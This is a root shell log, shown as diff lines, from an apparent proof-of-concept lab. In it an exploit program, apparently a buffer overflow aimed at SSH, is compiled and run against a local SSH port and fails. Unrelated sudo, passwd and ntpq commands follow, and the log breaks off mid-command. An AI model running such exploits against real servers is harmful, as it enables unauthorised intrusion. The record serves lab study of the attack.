+root@29bcb37807cf:/poc# cat > Makefile <<'EOF'
+> all:
+> \tg++ Exploit.cpp -o exploit
+> EOF
+root@29bcb37807cf:/poc# make
+Makefile:2: *** missing separator.  Stop.
+root@29bcb37807cf:/poc# cat > Makefile <<'EOF'
+> all:
+> g++ Exploit.cpp -o exploit
+> EOF
+root@29bcb37807cf:/poc# make
+Makefile:2: *** missing separator.  Stop.
+root@29bcb37807cf:/poc# g++ Exploit.cpp -o exploit
+root@29bcb37807cf:/poc# ./exploit
+
+Usage: ./exploit <saved eip> <count> <packet length> <username length> <host> <port> <h(i)>
+
+root@29bcb37807cf:/poc# ./exploit 0 1 256 8 127.0.0.1 22 0
+
+Saved Eip: &h + 1543007393
+Return Address: 0x811
+Packet Length: 264
+Username Length: 8
+
+./ssh -p 22 -v -l root 127.0.0.1
+sh: 1: ./ssh: not found
+root@29bcb37807cf:/poc#
+root@29bcb37807cf:/poc# sudo
+usage: sudo [-D level] -h | -K | -k | -V
+usage: sudo -v [-AknS] [-D level] [-g groupname|#gid] [-p prompt] [-u user name|#uid]
+usage: sudo -l[l] [-AknS] [-D level] [-g groupname|#gid] [-p prompt] [-U user name] [-u user name|#uid] [-g groupname|#gid] [command]
+usage: sudo [-AbEHknPS] [-r role] [-t type] [-C fd] [-D level] [-g groupname|#gid] [-p prompt] [-u user name|#uid] [-g groupname|#gid] [VAR=value] [-i|-s] [<command>]
+usage: sudo -e [-AknS] [-r role] [-t type] [-C fd] [-D level] [-g groupname|#gid] [-p prompt] [-u user name|#uid] file ...
+root@29bcb37807cf:/poc# passwd
+Enter new UNIX password:
+Retype new UNIX password:
+passwd: password updated successfully
+root@29bcb37807cf:/poc# ntpq
+bash: ntpq: command not found
+root@29bcb37807cf:/poc# curl https:
